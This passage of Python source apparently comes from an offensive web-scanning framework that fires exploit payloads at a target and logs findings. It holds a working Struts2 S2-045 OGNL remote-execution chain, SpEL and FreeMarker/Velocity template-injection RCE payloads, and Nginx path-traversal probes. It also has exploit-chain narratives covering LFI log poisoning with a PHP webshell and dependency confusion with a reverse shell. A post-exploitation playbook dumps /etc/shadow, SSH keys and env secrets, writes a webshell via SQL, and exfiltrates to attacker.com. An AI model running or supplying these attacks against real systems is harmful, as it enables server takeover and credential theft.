                                title=f"GraphQL {label} DoS Surface — {ep}",
                                severity="HIGH",
                                cvss=7.5,
                                cwe="CWE-400",
                                description=(
                                    f"GraphQL endpoint {ep} processed {label} query in {elapsed:.1f}s. "
                                    f"Alias count in response: {alias_count}. "
                                    "Indicates no query depth limiting, alias limiting, or cost analysis — "
                                    "enabling resource exhaustion DoS attacks."
                                ),
                                evidence=f"Elapsed: {elapsed:.2f}s | Aliases in response: {alias_count} | HTTP {r.status}",
                                poc_curl=(
                                    "curl -sk -X POST '" + url + "' "
                                    "-H 'Content-Type: application/json' "
                                    "-d '{\"query\": \"" + self.BATCH_QUERY_TMPL[:80] + "...\"}'"
                                ),
                                category="GraphQL",
                                remediation="Implement query depth limiting (max 10), alias limiting (max 20), query complexity analysis, and persisted queries. Use graphql-depth-limit, graphql-query-complexity."
                            ))
                except Exception:
                    pass
        return profile


class FullExploitNarrativeGen:
    """Synthesize a complete exploit narrative with full attack story and impact."""
    NAME = "Full Exploit Narrative Generator"
    NARRATIVES = [
        {
            "chain_id": "CHAIN-CLOUD-TAKEOVER",
            "name": "Cloud Account Takeover via SSRF",
            "steps": [
                "1. Identify SSRF-capable parameter via OOB DNS callback",
                "2. Pivot to cloud IMDS (169.254.169.254 or metadata.google.internal)",
                "3. Extract managed identity / IAM role credentials",
                "4. Authenticate to cloud API (aws sts, az account, gcloud auth)",
                "5. Enumerate IAM permissions, storage buckets, secrets",
                "6. Exfiltrate data, escalate to admin, deploy backdoor Lambda/Function",
            ],
            "impact": "Full cloud account compromise, data exfiltration, persistence",
            "cvss": 9.9,
        },
        {
            "chain_id": "CHAIN-JENKINS-RCE",
            "name": "Jenkins Groovy RCE → Lateral Movement",
            "steps": [
                "1. Access Jenkins /script endpoint (unauthenticated or weak creds)",
                "2. Execute Groovy: println 'id'.execute().text",
                "3. Read /var/jenkins_home/credentials.xml for stored secrets",
                "4. Extract SSH keys, API tokens, cloud credentials from Jenkins vaults",
                "5. Use credentials to pivot to connected systems (GitHub, AWS, GCP)",
                "6. Establish reverse shell / C2 beacon for persistence",
            ],
            "impact": "Full server RCE, credential harvest, lateral movement to all connected systems",
            "cvss": 10.0,
        },
        {
            "chain_id": "CHAIN-LFI-RCE",
            "name": "LFI → Log Poison → RCE",
            "steps": [
                "1. Confirm LFI via ?page=../../../../etc/passwd",
                "2. Include PHP interpreter via ?page=php://filter/convert.base64-encode/resource=index",
                "3. Poison Apache/Nginx access log: curl -A '<?php system($_GET[cmd]); ?>' target",
                "4. Include log file via LFI: ?page=../../../../var/log/apache2/access.log",
                "5. Execute commands: ?page=...access.log&cmd=id",
                "6. Upgrade to reverse shell, establish persistence",
            ],
            "impact": "OS-level RCE, full server compromise, data exfiltration",
            "cvss": 9.8,
        },
        {
            "chain_id": "CHAIN-AUTH-BYPASS-ADMIN",
            "name": "Auth Bypass → Admin Takeover → Data Exfil",
            "steps": [
                "1. Identify auth bypass via SQLi, JWT none-alg, or IDOR on /api/admin",
                "2. Access admin panel without valid credentials",
                "3. Create new admin account or reset existing admin password",
                "4. Access all user data, PII, financial records via admin API",
                "5. Export database via admin data-export function",
                "6. Modify user records / financial transactions",
            ],
            "impact": "Complete admin takeover, PII breach, financial fraud",
            "cvss": 9.6,
        },
        {
            "chain_id": "CHAIN-SUPPLY-CHAIN-SAST",
            "name": "Supply Chain → Internal Package Confusion → RCE",
            "steps": [
                "1. Extract internal package names from exposed package.json / requirements.txt",
                "2. Register same package names on public npm/PyPI with higher version",
                "3. Wait for CI/CD pipeline to install public version during build",
                "4. Malicious package executes postinstall/setup.py with reverse shell",
                "5. Access CI/CD secrets, source code, and production deployment credentials",
                "6. Pivot to production environment",
            ],
            "impact": "Supply chain compromise, CI/CD takeover, production deployment control",
            "cvss": 9.3,
        },
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        confirmed_ids = {f.id for f in profile.findings}
        confirmed_cats = {f.category for f in profile.findings}
        for n in self.NARRATIVES:
            applicable = (
                ("SSRF" in confirmed_cats or "Cloud" in str(confirmed_cats))
                if "CLOUD" in n["chain_id"] else
                ("Jenkins" in str(confirmed_cats) or "CI-CD" in str(confirmed_cats))
                if "JENKINS" in n["chain_id"] else
                ("LFI" in str(confirmed_ids) or "LFI" in str(confirmed_cats))
                if "LFI" in n["chain_id"] else
                ("SQL Injection" in confirmed_cats or "JWT" in str(confirmed_cats))
                if "AUTH" in n["chain_id"] else
                ("Supply Chain" in confirmed_cats)
            )
            profile.findings.append(Finding(
                id=n["chain_id"],
                title=f"[EXPLOIT CHAIN] {n['name']}",
                severity="CRITICAL" if applicable else "HIGH",
                cvss=n["cvss"],
                cwe="CWE-693",
                description=(
                    f"{'[APPLICABLE TO THIS TARGET]' if applicable else '[THEORETICAL — VERIFY PREREQUISITES]'} "
                    f"Complete exploit narrative: {n['name']}\n\n"
                    "Attack steps:\n" + "\n".join(n["steps"]) +
                    f"\n\nImpact: {n['impact']}"
                ),
                evidence=f"Applicable to target: {applicable} | CVSS: {n['cvss']}",
                poc_curl="# See attack steps above — each step must be verified manually",
                category="Exploit Chain",
                remediation="Address all prerequisite vulnerabilities. Implement defence-in-depth: WAF, egress filtering, least privilege, network segmentation, SIEM alerting."
            ))
        return profile


class PostExploitPathAnalyzer:
    """Map theoretical post-exploitation paths from all confirmed findings."""
    NAME = "Post-Exploit Path Analyzer"
    POST_EXPLOIT_PLAYBOOK = {
        "RCE": [
            "cat /etc/passwd && cat /etc/shadow (privilege check)",
            "find / -perm -4000 -type f 2>/dev/null (SUID binaries)",
            "sudo -l (sudo permissions)",
            "cat ~/.ssh/id_rsa (SSH private keys)",
            "env | grep -i 'secret\\|key\\|pass\\|token' (env secrets)",
            "cat /proc/net/fib_trie (internal network ranges)",
            "arp -a && ip route (network topology)",
            "ps aux && netstat -tlnp (running services)",
            "find / -name '*.conf' -o -name '*.cfg' 2>/dev/null | head -20",
            "curl http://169.254.169.254/latest/meta-data/ 2>/dev/null (cloud IMDS)",
            "cat /var/www/html/.env 2>/dev/null (application secrets)",
            "mysql -u root -p'' -e 'show databases;' 2>/dev/null (DB access)",
        ],
        "SQLi": [
            "Extract schema: SELECT table_name FROM information_schema.tables",
            "Dump users table: SELECT username,password FROM users LIMIT 10",
            "Read files: SELECT LOAD_FILE('/etc/passwd') (MySQL)",
            "Write webshell: SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/cmd.php'",
            "OOB exfil: SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\x')) (MSSQL)",
            "Extract credentials from app config tables",
        ],
        "SSRF": [
            "Probe internal network: http://10.0.0.1/, http://192.168.1.1/",
            "AWS IMDS: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "GCP IMDS: http://metadata.google.internal/computeMetadata/v1/",
            "Azure IMDS: http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "Internal services: http://localhost:8080/, :8443, :6379, :27017",
            "K8s API: http://10.96.0.1:443/api/v1/secrets",
        ],
        "LFI": [
            "/etc/passwd, /etc/shadow, /etc/hosts, /etc/crontab",
            "/proc/self/environ (env variables including secrets)",
            "/var/log/apache2/access.log (log poisoning → RCE)",
            "/var/log/nginx/access.log (nginx log poison)",
            "/home/*/.ssh/id_rsa, /root/.ssh/id_rsa",
            "/var/www/html/.env, config.php, wp-config.php",
            "php://filter/convert.base64-encode/resource=config (PHP source)",
        ],
        "JWT Bypass": [
            "Forge admin token with alg=none",
            "Predict HMAC secret via cracking: hashcat -a 0 -m 16500 token.jwt wordlist.txt",
            "Forge token for all user roles and enumerate admin endpoints",
            "Enumerate /api/admin, /api/v*/admin/* with forged token",
            "Extract other user data via IDOR with crafted sub/user_id claims",
        ],
    }

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        confirmed_cats = {f.category for f in profile.findings}
        confirmed_sevs = {f.severity for f in profile.findings}
        playbook_entries = []
        for cat, steps in self.POST_EXPLOIT_PLAYBOOK.items():
            cat_match = (
                cat == "RCE" and any(c in confirmed_cats for c in ["RCE", "Command Injection", "SSTI"]) or
                cat == "SQLi" and "SQL Injection" in confirmed_cats or
                cat == "SSRF" and "SSRF" in confirmed_cats or
                cat == "LFI" and any("LFI" in f.id for f in profile.findings) or
                cat == "JWT Bypass" and "JWT" in str(confirmed_cats)
            )
            if cat_match or "CRITICAL" in confirmed_sevs:
                playbook_entries.append(f"\n[{cat} Post-Exploitation]")
                playbook_entries.extend(f"  → {s}" for s in steps)
        if playbook_entries:
            profile.findings.append(Finding(
                id="POST-EXPLOIT-MAP-001",
                title="Post-Exploitation Path Map — Authorized Testing Playbook",
                severity="INFO",
                cvss=0.0,
                cwe="CWE-693",
                description=(
                    "Post-exploitation paths identified based on confirmed findings. "
                    "For authorized penetration testing only — document evidence, "
                    "stop at proof-of-concept, report to client/program."
                ),
                evidence="\n".join(playbook_entries),
                poc_curl="# Execute only within authorized scope with written permission",
                category="Post-Exploitation Analysis",
                remediation="Each post-exploitation path represents a concrete attack vector. Address findings in order of CVSS score. Implement network segmentation, EDR, and SIEM to detect post-exploitation activity."
            ))
        return profile


class AttackSurfaceScorecard:
    """Generate a quantitative attack surface scorecard and risk matrix."""
    NAME = "Attack Surface Scorecard"
    RISK_WEIGHTS = {
        "CRITICAL": 25,
        "HIGH":     10,
        "MEDIUM":    4,
        "LOW":       1,
        "INFO":      0,
    }
    CATEGORY_SEVERITY_MAP = {
        "RCE":               ("CRITICAL", 10),
        "SQL Injection":     ("CRITICAL", 9),
        "SSRF → Cloud Pivot":("CRITICAL", 9),
        "K8s / Container":   ("CRITICAL", 9),
        "Webshell/Backdoor": ("CRITICAL", 10),
        "LDAP Injection":    ("CRITICAL", 9),
        "Jenkins / CI-CD":   ("CRITICAL", 9),
        "Secrets / Tokens":  ("CRITICAL", 9),
        "Source Disclosure": ("CRITICAL", 8),
        "Database Exposure": ("CRITICAL", 9),
        "Security Headers":  ("HIGH", 5),
        "Clickjacking":      ("MEDIUM", 5),
        "SSRF":              ("HIGH", 7),
        "Supply Chain":      ("HIGH", 8),
        "Exploit Chain":     ("CRITICAL", 10),
    }

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        from collections import Counter
        sev_counts = Counter(f.severity for f in profile.findings)
        cat_counts = Counter(f.category for f in profile.findings)
        total_score = sum(
            self.RISK_WEIGHTS.get(sev, 0) * count
            for sev, count in sev_counts.items()
        )
        max_score = 500
        pct = min(100, round(total_score / max_score * 100))
        if pct >= 80:
            risk_band = "CRITICAL — Immediate remediation required"
        elif pct >= 50:
            risk_band = "HIGH — Urgent remediation required within 7 days"
        elif pct >= 25:
            risk_band = "MEDIUM — Remediation required within 30 days"
        elif pct >= 10:
            risk_band = "LOW — Remediation required within 90 days"
        else:
            risk_band = "INFORMATIONAL — Monitor and review"
        matrix_lines = [
            f"Attack Surface Scorecard — {profile.host}",
            f"{'═' * 50}",
            f"Risk Score    : {total_score} / {max_score} ({pct}%)",
            f"Risk Band     : {risk_band}",
            f"",
            f"Finding Distribution:",
        ]
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            count = sev_counts.get(sev, 0)
            bar = "█" * min(count, 40)
            matrix_lines.append(f"  {sev:10} : {count:4} {bar}")
        matrix_lines += ["", "Top Attack Categories:"]
        for cat, count in cat_counts.most_common(10):
            matrix_lines.append(f"  {cat[:40]:40} : {count}")
        matrix_lines += [
            "",
            "Remediation Priority Matrix:",
            "  Priority 1 (Immediate): All CRITICAL findings",
            "  Priority 2 (7 days):    All HIGH findings",
            "  Priority 3 (30 days):   All MEDIUM findings",
            "  Priority 4 (90 days):   All LOW findings",
        ]
        profile.findings.append(Finding(
            id="SCORECARD-001",
            title=f"Attack Surface Scorecard — Risk Score {total_score}/{max_score} ({pct}%) — {risk_band.split(' —')[0]}",
            severity="CRITICAL" if pct >= 80 else "HIGH" if pct >= 50 else "MEDIUM" if pct >= 25 else "LOW",
            cvss=0.0,
            cwe="CWE-693",
            description="\n".join(matrix_lines),
            evidence=f"Total findings: {sum(sev_counts.values())} | Weighted score: {total_score}/{max_score}",
            poc_curl="# This is a summary scorecard — see individual findings for PoC commands",
            category="Risk Scorecard",
            remediation="Use this scorecard to prioritise remediation. Share with development team and security leadership. Re-scan after fixes to verify remediation effectiveness."
        ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOLS 211-270 — 60 Red/Black Team Skills (Phase 13)
# ══════════════════════════════════════════════════════════════

class OGNLInjectionScanner:
    """Detect OGNL/EL injection in Apache Struts2, Spring, JSP — CVE-2017-5638 family."""
    NAME = "OGNL Injection Scanner"
    OGNL_PAYLOADS = [
        ("%{7*7}",                  "49",    "OGNL basic arithmetic"),
        ("${7*7}",                  "49",    "EL basic arithmetic"),
        ("#{7*7}",                  "49",    "JSP EL arithmetic"),
        ("%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new+java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
                                    "uid=",  "Struts2 S2-045 RCE"),
        ("T(java.lang.Runtime).getRuntime().exec('id')", "uid=", "Spring SpEL RCE"),
        ("${Runtime.exec('id')}",   "uid=",  "JSP EL exec"),
        ("%{class.classLoader.URLs[0]}", "file:", "OGNL classLoader leak"),
    ]
    OGNL_PARAMS = ["name", "username", "search", "q", "query", "action",
                   "redirect", "next", "target", "data", "value", "field",
                   "message", "comment", "title", "description", "text"]
    OGNL_HEADERS = ["Content-Type", "Accept", "X-Forwarded-For",
                    "User-Agent", "Referer", "X-Custom-Header"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import urllib.parse
        base = profile.url.rstrip("/")
        for payload, expected, label in self.OGNL_PAYLOADS[:4]:
            enc = urllib.parse.quote(payload)
            # Test via query param
            for param in self.OGNL_PARAMS[:6]:
                url = f"{base}/?{param}={enc}"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if r and r.status in (200, 400, 500):
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if expected in body or "49" in body:
                            profile.findings.append(Finding(
                                id=f"OGNL-{label.replace(' ','_').upper()[:16]}-{param.upper()[:8]}",
                                title=f"OGNL/EL Injection — {label} via ?{param}",
                                severity="CRITICAL",
                                cvss=10.0,
                                cwe="CWE-917",
                                description=(
                                    f"OGNL/Expression Language injection via parameter '{param}'. "
                                    f"Payload '{payload[:60]}' returned expected output '{expected}'. "
                                    "Enables full RCE on server — Struts2/Spring framework exploitation."
                                ),
                                evidence=f"Param: {param} | Expected: {expected} | Found in response: True",
                                poc_curl=(
                                    f"curl -sk '{url}'\n"
                                    f"# Struts2 Content-Type RCE (S2-045):\n"
                                    f"curl -sk -X POST '{base}/' "
                                    f"-H \"Content-Type: %{{(#cmd='id').(#cmds={{'/bin/bash','-c',#cmd}})."
                                    f"(#p=new java.lang.ProcessBuilder(#cmds)).(#p.start()).text}}\""
                                ),
                                category="OGNL / EL Injection",
                                remediation="Upgrade Struts2 to ≥2.5.33 / ≥6.x. Disable dynamic method invocation. Apply OGNL expression sandbox. Use CSP for Spring EL contexts."
                            ))
                            break
                except Exception:
                    pass
            # Test via Content-Type header (S2-045 style)
            for path in ["/", "/index.action", "/login.action", "/search.action"]:
                url = f"{base}{path}"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout, "POST", b"x=1",
                               {"Content-Type": payload})
                    if r and r.status in (200, 400, 500):
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if expected in body:
                            profile.findings.append(Finding(
                                id=f"OGNL-CTYPE-{label.replace(' ','_').upper()[:16]}",
                                title=f"Struts2 Content-Type OGNL Injection — {label}",
                                severity="CRITICAL",
                                cvss=10.0,
                                cwe="CWE-917",
                                description=(
                                    f"Struts2 S2-045 style OGNL injection via Content-Type header at {path}. "
                                    f"Expected output '{expected}' found in response."
                                ),
                                evidence=body[:200],
                                poc_curl=(
                                    f"curl -sk -X POST '{url}' "
                                    f"-H 'Content-Type: {payload[:80]}...'"
                                ),
                                category="OGNL / EL Injection",
                                remediation="Upgrade Apache Struts2 immediately. Apply CVE-2017-5638 patch. Implement WAF rule for OGNL patterns in Content-Type header."
                            ))
                            break
                except Exception:
                    pass
        return profile


class ELInjectionScanner:
    """Detect Java Expression Language injection (Spring SpEL, JSP EL, Thymeleaf)."""
    NAME = "EL Injection Scanner"
    EL_PAYLOADS = [
        ("${7*7}",                                  "49",   "Basic EL"),
        ("#{7*7}",                                  "49",   "JSP EL"),
        ("*{7*7}",                                  "49",   "Thymeleaf SpEL"),
        ("[[${7*7}]]",                              "49",   "Thymeleaf inline"),
        ("${T(java.lang.System).getenv()}",         "PATH", "Spring SpEL env"),
        ("${applicationContext}",               "org.spring", "Spring context leak"),
        ("${#httpServletRequest.class}",        "class ",     "Thymeleaf request class"),
        ("@{T(java.lang.Runtime).getRuntime()}", "java.lang", "Spring SpEL runtime"),
    ]
    EL_PARAMS = ["name", "template", "message", "subject", "body", "email",
                 "text", "title", "content", "value", "q", "search", "page",
                 "lang", "locale", "theme", "view"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import urllib.parse
        base = profile.url.rstrip("/")
        for payload, expected, label in self.EL_PAYLOADS:
            enc = urllib.parse.quote(payload)
            for param in self.EL_PARAMS[:8]:
                url = f"{base}/?{param}={enc}"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if r and r.status in (200, 400, 500):
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if expected in body and payload not in body:
                            profile.findings.append(Finding(
                                id=f"EL-INJECT-{label.replace(' ','_').upper()[:16]}-{param.upper()[:6]}",
                                title=f"EL Injection — {label} via ?{param}",
                                severity="CRITICAL",
                                cvss=9.8,
                                cwe="CWE-917",
                                description=(
                                    f"Expression Language injection via '{param}': payload '{payload}' "
                                    f"evaluated to '{expected}'. Enables server-side code execution "
                                    "in Spring/Thymeleaf/JSP context."
                                ),
                                evidence=f"Payload: {payload} → Response contains: {expected}",
                                poc_curl=(
                                    f"curl -sk '{url}'\n"
                                    f"# RCE via Spring SpEL:\n"
                                    f"curl -sk '{base}/?{param}="
                                    + urllib.parse.quote(
                                        "${T(java.lang.Runtime).getRuntime().exec('id')}")
                                    + "'"
                                ),
                                category="EL / SpEL Injection",
                                remediation="Sanitise all user input before passing to template engines. Use safe Thymeleaf context (th:text not th:utext). Disable SpEL evaluation on untrusted input. Use Spring Security expression handler restrictions."
                            ))
                            break
                except Exception:
                    pass
        return profile


class VelocityFreeMarkerSSTI:
    """Detect Velocity, FreeMarker, Pebble, and Smarty SSTI patterns."""
    NAME = "Velocity/FreeMarker SSTI"
    SSTI_PAYLOADS = [
        # (payload, expected_output, engine)
        ("#set($x=7*7)${x}",              "49",    "Velocity"),
        ("#set($e='exp');$e.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke($e.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')",
                                           "java",  "Velocity RCE"),
        ("<#assign x=7*7>${x}",            "49",    "FreeMarker"),
        ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
                                           "uid=",  "FreeMarker RCE"),
        ("{{7*7}}",                        "49",    "Jinja2/Twig"),
        ("{7*7}",                          "49",    "Smarty"),
        ("{php}echo 7*7;{/php}",           "49",    "Smarty PHP"),
        ("{% 7*7 %}",                     "49",    "Pebble"),
        ("{{ ''.__class__.__mro__[2].__subclasses__() }}", "object", "Jinja2 subclasses"),
        ("{$smarty.version}",              "Smarty","Smarty version leak"),
    ]
    SSTI_PARAMS = ["template", "name", "subject", "body", "message", "text",
                   "content", "title", "lang", "locale", "page", "view",
                   "layout", "theme", "format", "render", "tpl"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import urllib.parse
        base = profile.url.rstrip("/")
        for payload, expected, engine in self.SSTI_PAYLOADS:
            enc = urllib.parse.quote(payload)
            for param in self.SSTI_PARAMS[:6]:
                url = f"{base}/?{param}={enc}"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if r and r.status in (200, 500):
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if expected in body and payload.replace(urllib.parse.quote(payload), "") not in body:
                            profile.findings.append(Finding(
                                id=f"SSTI-{engine.replace('/','_').replace(' ','_').upper()[:12]}-{param.upper()[:8]}",
                                title=f"SSTI {engine} via ?{param}",
                                severity="CRITICAL",
                                cvss=9.8,
                                cwe="CWE-1336",
                                description=(
                                    f"{engine} SSTI detected via parameter '{param}'. "
                                    f"Payload '{payload[:60]}' evaluated: expected '{expected}' found in response. "
                                    f"Enables server-side code execution."
                                ),
                                evidence=f"Engine: {engine} | Expected: {expected} | Confirmed: True",
                                poc_curl=f"curl -sk '{url}'",
                                category="SSTI",
                                remediation=f"Sanitise all user input before passing to {engine} templates. Use sandboxed template execution. Disable dangerous built-ins. Apply allowlist on template variable names."
                            ))
                            break
                except Exception:
                    pass
        return profile


class OAuth2DeviceCodeAbuse:
    """Detect OAuth2 device authorization flow misconfigurations enabling phishing."""
    NAME = "OAuth2 Device Code Abuse"
    DEVICE_PATHS = [
        "/oauth/device/code", "/oauth2/device/code", "/oauth/device_authorization",
        "/connect/deviceauthorization", "/v2/device/code",
        "/.well-known/openid-configuration", "/oauth2/.well-known/openid-configuration",
        "/oauth/authorize", "/oauth2/authorize", "/auth/oauth2/authorize",
        "/realms/master/protocol/openid-connect/auth/device",
        "/oauth2/default/v1/device/authorize",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.DEVICE_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 400, 405):
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if any(sig in body for sig in [
                        "device_code", "user_code", "verification_uri",
                        "device_authorization_endpoint", "token_endpoint",
                        "grant_types_supported", "response_types_supported",
                        '"device_authorization"', "openid-configuration"
                    ]):
                        is_device_flow = "device_code" in body or "device_authorization" in body
                        profile.findings.append(Finding(
                            id=f"OAUTH2-DEVICE-{path.replace('/','_').strip('_')[:18].upper()}",
                            title=f"OAuth2 {'Device Flow' if is_device_flow else 'Authorization'} Endpoint: {path}",
                            severity="HIGH" if is_device_flow else "MEDIUM",
                            cvss=7.1 if is_device_flow else 5.3,
                            cwe="CWE-287",
                            description=(
                                f"OAuth2 {'device authorization flow' if is_device_flow else 'endpoint'} "
                                f"detected at {path}. "
                                + ("Device flow enables real-time phishing: attacker generates device_code, "
                                   "tricks victim into entering user_code, attacker polls for access token. "
                                   "No interaction with victim's device required."
                                   if is_device_flow else
                                   "OAuth2 endpoint enumerated — review for implicit flow, PKCE, and state parameter enforcement.")
                            ),
                            evidence=body[:300],
                            poc_curl=(
                                f"# Step 1 — Request device code:\n"
                                f"curl -sk -X POST '{url}' -d 'client_id=CLIENT_ID&scope=openid email profile'\n"
                                f"# Step 2 — Show user_code to victim, poll for token:\n"
                                f"curl -sk -X POST TOKEN_ENDPOINT "
                                f"-d 'grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=DEVICE_CODE&client_id=CLIENT_ID'"
                            ),
                            category="OAuth2 / OIDC",
                            remediation="Implement short device code expiry (≤15 min). Require re-authentication on device flow. Display trusted app name to user. Implement rate-limiting on polling. Block device flow for sensitive scopes."
                        ))
            except Exception:
                pass
        return profile


class AzureADMisconfigDetector:
    """Detect Azure AD token endpoint misconfigs, implicit flow, and consent phishing surface."""
    NAME = "Azure AD Misconfig Detector"
    AAD_PATHS = [
        "/oauth2/v2.0/token", "/oauth2/token",
        "/oauth2/v2.0/authorize", "/oauth2/authorize",
        "/.well-known/openid-configuration",
        "/oauth2/v2.0/.well-known/openid-configuration",
        "/.well-known/microsoft-identity-platform-endpoint-discovery",
        "/adminconsent", "/oauth2/v2.0/adminconsent",
        "/sync/provisioning/exportChanges",
        "/graph/v1.0/me", "/graph/v1.0/users",
        "/api/token", "/api/auth/token",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.AAD_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 400, 401):
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if any(sig in body for sig in [
                        "tenant", "client_id", "authorization_endpoint",
                        "token_endpoint", "microsoft.com", "login.microsoftonline",
                        "id_token_signing_alg", "access_token",
                        "error_description", "AADSTS", "Bearer",
                        "microsoftonline.com", "azure.com",
                    ]):
                        has_implicit = "token" in body and "implicit" in body.lower()
                        profile.findings.append(Finding(
                            id=f"AAD-{path.replace('/','_').strip('_')[:18].upper()}",
                            title=f"Azure AD {'Implicit Flow' if has_implicit else 'Endpoint'} Exposed: {path}",
                            severity="HIGH" if has_implicit else "MEDIUM",
                            cvss=7.1 if has_implicit else 5.3,
                            cwe="CWE-287",
                            description=(
                                f"Azure AD authentication endpoint at {path}. "
                                + ("Implicit flow enabled — access tokens returned in URL fragment, "
                                   "vulnerable to token leakage via Referer header and browser history. "
                                   if has_implicit else
                                   "Azure AD endpoint discovered — enumerate for tenant ID, client configuration, and consent phishing.")
                            ),
                            evidence=body[:300],
                            poc_curl=(
                                f"curl -sk '{url}'\n"
                                f"# Enumerate tenant:\n"
                                f"curl -sk 'https://login.microsoftonline.com/{profile.apex}/.well-known/openid-configuration'"
                            ),
                            category="Azure AD / OAuth2",
                            remediation="Disable implicit flow. Use PKCE with authorization code flow. Implement admin consent workflow. Restrict redirect URIs. Monitor for suspicious consent grants."
                        ))
            except Exception:
                pass
        return profile


class AWSS3PresignedAbuse:
    """Detect S3 presigned URL abuse, public bucket policy, and cross-account issues."""
    NAME = "AWS S3 Presigned URL Abuse"
    S3_ENDPOINTS = [
        "/api/upload", "/api/presign", "/api/s3/presign",
        "/api/v1/upload", "/api/v2/upload", "/upload/presign",
        "/files/presign", "/media/presign", "/storage/presign",
        "/api/attachment/upload", "/api/documents/upload",
        "/api/avatar/upload", "/api/profile/photo",
        "/api/export", "/api/download", "/api/files",
    ]
    S3_BUCKET_PATTERNS = [
        "X-Amz-Signature", "AWSAccessKeyId", "x-amz-credential",
        "X-Amz-Security-Token", "amazonaws.com", "s3.amazonaws.com",
        "x-amz-date", "x-amz-algorithm", "presigned",
        "Content-Disposition: attachment", "X-Amz-Expires",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.S3_ENDPOINTS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 201, 400, 401, 403):
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    hdrs = str(r.headers)
                    combined = body + hdrs
                    hits = [p for p in self.S3_BUCKET_PATTERNS if p.lower() in combined.lower()]
                    if hits:
                        profile.findings.append(Finding(
                            id=f"S3-PRESIGN-{path.replace('/','_').strip('_')[:18].upper()}",
                            title=f"S3 Presigned URL / AWS Storage Endpoint: {path}",
                            severity="HIGH",
                            cvss=7.5,
                            cwe="CWE-639",
                            description=(
                                f"AWS S3 presigned URL or storage endpoint at {path}. "
                                f"Signatures found: {', '.join(hits[:4])}. "
                                "Presigned URL abuse: enumerate bucket name, test for public listing, "
                                "check ACL for world-readable/writable, attempt cross-account access."
                            ),
                            evidence=f"Indicators: {hits} | Response snippet: {body[:200]}",
                            poc_curl=(
                                f"curl -sk '{url}'\n"
                                f"# Test bucket listing (replace BUCKET-NAME):\n"
                                f"curl -sk 'https://BUCKET-NAME.s3.amazonaws.com/?list-type=2'\n"
                                f"# Check bucket ACL:\n"
                                f"aws s3api get-bucket-acl --bucket BUCKET-NAME"
                            ),
                            category="Cloud Storage",
                            remediation="Block public S3 access at account level (Block Public Access). Apply bucket policies with explicit Deny for * principal. Use short-lived presigned URLs (≤15 min). Log and alert on GetBucketAcl API calls."
                        ))
            except Exception:
                pass
        return profile


class NginxMisconfigDetector:
    """Detect Nginx off-by-slash, alias traversal, status page, and merge_slashes bypass."""
    NAME = "Nginx Misconfig Detector"
    NGINX_PROBES = [
        # (path, description, indicators)
        ("/nginx_status",     "Nginx status module exposed",
         ["Active connections:", "server accepts", "Reading:", "Writing:", "Waiting:"]),
        ("/stub_status",      "Nginx stub_status exposed",
         ["Active connections:", "server accepts handled"]),
        ("/.git/..%2f..%2fnginx_status", "Nginx alias traversal via encoded slashes",
         ["Active connections:", "accepts"]),
        ("/api../admin",      "Nginx off-by-slash alias bypass",
         ["admin", "dashboard", "management"]),
        ("/static..//etc/passwd", "Nginx alias path traversal",
         ["root:", "bin/bash"]),
        ("/%2e%2e/etc/passwd","Nginx URL normalization bypass — LFI",
         ["root:", "bin/bash"]),
        ("//etc/passwd",      "Nginx double-slash normalization bypass",
         ["root:", "bin/bash"]),
        ("/api/v1/..%2finternal", "Nginx merge_slashes=off path confusion",
         ["internal", "admin", "private"]),
        ("/app/../../../etc/passwd", "Nginx path traversal",
         ["root:", "bin/bash"]),
    ]

